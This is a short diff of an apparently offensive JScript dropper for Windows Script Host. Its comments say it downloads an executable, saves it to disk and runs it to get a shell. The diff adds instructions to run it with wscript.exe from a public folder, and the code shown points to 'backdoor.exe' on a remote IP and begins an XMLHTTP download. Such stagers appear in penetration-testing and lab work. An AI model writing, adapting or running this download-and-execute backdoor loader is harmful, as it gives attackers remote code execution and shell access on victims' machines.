@@ -3,7 +3,10 @@ save it on the disk. Then it is running the executable, in the result, we are ge
 shell.
 */
 
-//NOTE: Remember to replace your IP:PORT below
+// NOTE: Remember to replace your IP:PORT below
+
+// Execute with wscript.exe utility 
+// wscript.exe C:\Users\Public\code.js
 
 var url = "http://10.10.15.2/backdoor.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
